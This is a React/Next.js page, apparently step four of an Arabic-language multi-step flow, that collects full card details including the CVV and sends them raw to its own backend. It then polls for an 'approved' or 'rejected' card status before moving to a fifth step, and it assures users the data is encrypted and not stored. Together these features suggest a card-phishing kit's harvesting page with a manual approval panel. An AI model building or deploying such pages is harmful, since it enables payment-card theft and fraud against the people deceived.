'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Layout from '@/components/Layout';
import ProgressBar from '@/components/ProgressBar';
import { api } from '@/lib/api';

export default function Step4Page() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [checking, setChecking] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
    cardType: 'visa',
  });

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, '');
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
    return formatted;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s/g, '');
    if (value.length <= 16) {
      setFormData({ ...formData, cardNumber: value });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      await api.savePayment({
        cardNumber: formData.cardNumber,
        cardHolder: formData.cardHolder,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        cardType: formData.cardType,
      });

      // Start checking for approval
      setChecking(true);
      checkApproval();
    } catch (error) {
      console.error('Error saving payment:', error);
      setLoading(false);
    }
  };

  const checkApproval = async () => {
    try {
      const result = await api.checkPaymentApproval();
      
      if (result.success && result.card_status === 'approved') {
        router.push('/step5');
      } else if (result.success && result.card_status === 'rejected') {
        alert('تم رفض البطاقة. يرجى المحاولة مرة أخرى.');
        setLoading(false);
        setChecking(false);
      } else {
        // Continue checking
        setTimeout(checkApproval, 2000);
      }
    } catch (error) {
      console.error('Error checking approval:', error);
      setTimeout(checkApproval, 2000);
    }
  };

  return (
    <Layout title="الخطوة الرابعة - معلومات البطاقة البنكية">
      <ProgressBar currentStep={4} />

      {checking && (
        <div className="mb-6 bg-blue-50 border-r-4 border-blue-400 p-4 rounded">
          <div className="flex items-center">
            <div className="spinner ml-3"></div>
            <p className="text-blue-700">
              جاري التحقق من البطاقة... يرجى الانتظار
            </p>
          </div>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label htmlFor="cardType" className="block text-sm font-medium text-gray-700 mb-2">
            نوع البطاقة <span className="text-red-500">*</span>
          </label>
          <select
            id="cardType"
            value={formData.cardType}
            onChange={(e) => setFormData({ ...formData, cardType: e.target.value })}
            className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent"
            required
          >
            <option value="visa">Visa</option>
            <option value="mastercard">Mastercard</option>
            <option value="mada">مدى</option>
          </select>
        </div>

        <div>
          <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-2">
            رقم البطاقة <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            id="cardNumber"
            value={formatCardNumber(formData.cardNumber)}
            onChange={handleCardNumberChange}
            className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent font-mono text-lg"
            placeholder="1234 5678 9012 3456"
            required
          />
        </div>

        <div>
          <label htmlFor="cardHolder" className="block text-sm font-medium text-gray-700 mb-2">
            اسم حامل البطاقة <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            id="cardHolder"
            value={formData.cardHolder}
            onChange={(e) => setFormData({ ...formData, cardHolder: e.target.value.toUpperCase() })}
            className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent uppercase"
            placeholder="CARDHOLDER NAME"
            required
          />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <label htmlFor="expiryDate" className="block text-sm font-medium text-gray-700 mb-2">
              تاريخ الانتهاء <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              id="expiryDate"
              value={formData.expiryDate}
              onChange={(e) => {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                  value = value.slice(0, 2) + '/' + value.slice(2, 4);
                }
                setFormData({ ...formData, expiryDate: value });
              }}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent font-mono"
              placeholder="MM/YY"
              maxLength={5}
              required
            />
          </div>

          <div>
            <label htmlFor="cvv" className="block text-sm font-medium text-gray-700 mb-2">
              CVV <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              id="cvv"
              value={formData.cvv}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '');
                if (value.length <= 3) {
                  setFormData({ ...formData, cvv: value });
                }
              }}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0876b1] focus:border-transparent font-mono"
              placeholder="123"
              maxLength={3}
              required
            />
          </div>
        </div>

        <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
          <div className="flex items-start">
            <svg className="h-5 w-5 text-gray-400 ml-2 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
            </svg>
            <p className="text-sm text-gray-600">
              معلومات البطاقة محمية ومشفرة. لن يتم تخزينها بشكل دائم.
            </p>
          </div>
        </div>

        <div className="flex gap-4 pt-6">
          <button
            type="submit"
            disabled={loading}
            className="flex-1 bg-[#0876b1] hover:bg-[#065681] text-white font-bold py-3 px-6 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? 'جاري المعالجة...' : 'التالي ←'}
          </button>
          <button
            type="button"
            onClick={() => router.back()}
            disabled={loading}
            className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-6 rounded-lg transition-colors disabled:opacity-50"
          >
            → السابق
          </button>
        </div>
      </form>
    </Layout>
  );
}
